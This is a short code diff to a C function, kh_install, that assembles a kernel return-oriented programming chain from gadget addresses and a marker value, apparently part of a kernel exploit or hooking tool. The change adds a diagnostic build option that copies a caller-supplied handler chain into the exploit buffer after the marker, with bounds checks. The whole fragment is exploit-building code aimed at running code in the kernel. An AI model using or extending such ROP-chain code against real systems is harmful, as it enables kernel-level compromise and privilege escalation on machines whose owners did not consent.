@@ -429,8 +429,15 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
 #endif
   handler_len = (handler && handler->len) ? handler->len : 0;
 #ifdef AP_DIAG_PRESTAGE_1270
+#ifndef AP_DIAG_STORE_HANDLER_1270
   if (handler_len)
     return -19;
+#else
+  // This diagnostic appends a bounded chain after the known-good marker.
+  // Reserve room for the marker and the resume tail before copying it.
+  if (handler_len > sizeof bigbuf - 0x100)
+    return -19;
+#endif
 #endif
 #ifndef AP_DIAG_PRESTAGE_1270
   restore_off = save_len + handler_len;
@@ -447,6 +454,13 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
   off = putq(bigbuf, off, 0x1270DBDB5EEDBEEFULL);
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
+#endif
+#if defined(AP_DIAG_PRESTAGE_1270) && defined(AP_DIAG_STORE_HANDLER_1270)
+  if (off + handler_len + 0x100 > sizeof bigbuf)
+    return -19;
+  for (size_t i = 0; i < handler_len; i++)
+    bigbuf[off + i] = handler->buf[i];
+  off += handler_len;
 #endif
 #ifndef AP_DIAG_PRESTAGE_1270
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RSI));   // rax = rsi
